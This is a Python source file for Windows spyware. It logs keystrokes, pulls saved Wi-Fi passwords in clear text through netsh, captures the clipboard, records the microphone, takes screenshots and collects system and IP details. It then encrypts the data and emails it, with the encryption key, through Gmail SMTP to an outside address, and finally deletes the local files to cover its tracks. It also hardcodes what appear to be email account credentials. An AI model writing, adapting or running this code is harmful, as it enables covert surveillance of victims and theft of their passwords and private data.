from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import subprocess

import socket
import platform

import time
import os

import win32clipboard

from pynput.keyboard import Key, Listener

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

from requests import get

from PIL import ImageGrab

keys_info = "key_log.txt"
system_info = "systeminfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
wifi_info = "wifi.txt"
encr_key = "e_key.txt"

keys_encr = "e_key.txt"
sys_encr = "e_sys.txt"
clip_encr = "e_clip.txt"
wifi_encr = "e_wifi.txt"

microphone_time = 10
time_iteration = 10
number_of_iterations_end = 1

email_address = "hariramshambo@gmail.com"
password = "hariram123"
toaddr = "error.error@ultramailinator.com"


file_path = "C:\\Users\\_negative\\PycharmProjects\\task\\project"
extend = "\\"
file_merge = file_path + extend


#to send email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "THE DATA"
    body = "data sent successfully"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('content-Disposition', "attachment; filename= %s " % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.ehlo()
    s.starttls()
    s.ehlo()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


#generate key
e_key = Fernet.generate_key()
file = open(file_path + extend + encr_key, 'wb')
file.write(e_key)
file.close()
send_email(encr_key, file_path + extend + encr_key, toaddr)
print("key sent")


#get wifi password
def wifi_password():
    with open(file_path + extend + wifi_info, "a") as f:
        a = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore").split('\n')
        a = [i.split(":")[1][1:-1] for i in a if "All User Profile" in i]
        for i in a:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8',errors="ignore").split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                try:
                    f.write("{:<30}|  {:<}\n".format(i, results[0]))
                except IndexError:
                    f.write("{:<30}|  {:<}\n".format(i, ""))
            except subprocess.CalledProcessError:
                f.write("{:<30}|  {:<}\n".format(i, "ENCODING ERROR"))


#to get system info
def computer_info():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        IPaddress = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP address: " + public_ip)

        except Exception:
            f.write("error")

        f.write("\nprocessor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("machine: " + platform.machine() + '\n')
        f.write("host name: " + hostname + ';\n')
        f.write("private ip address: " + IPaddress + '\n')


#get clipboard info
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("clipboard data: \n" + pasted_data)

        except:
            f.write("\ncannot be copied\n")


#get recording
def microphone():
    fs = 44100
    se = microphone_time

    my_recording = sd.rec(int(se * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_info, fs, my_recording)

    send_email(audio_info, file_path + extend + audio_info, toaddr)

    print("audio sent")


#take screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)

    send_email(screenshot_info, file_path + extend + screenshot_info, toaddr)

    print("screenshot sent")


computer_info()
wifi_password()

#keylogger
number_of_iterations = 0
currentTime = time.time()
k_stoppingTime = currentTime + 15
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    keys = []
    count = 0

    def on_press(key):
        global keys, count, currentTime, k_stoppngTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_info, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > k_stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print("keylogger")

    if currentTime > stoppingTime:
        #if more than 1 iteration
        #with open(file_path + extend + keys_info, "w") as f:
        #   f.write(" ")
        screenshot()

        microphone()

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

#encryption
files_to_encr = [file_merge + system_info, file_merge + clipboard_info, file_merge + keys_info, file_merge + wifi_info]
encrypted_file_names = [file_merge + sys_encr, file_merge + clip_encr, file_merge + keys_encr, file_merge + wifi_encr]
count = 0

for encrypting_file in files_to_encr:
    with open(files_to_encr[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(e_key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    print(encrypted_file_names[count] + "sent")
    count += 1

time.sleep(80)

#clearing tracks
delete_file = [system_info, clipboard_info, keys_info, screenshot_info, audio_info, wifi_info]
for file in delete_file:
    os.remove(file_merge + file)

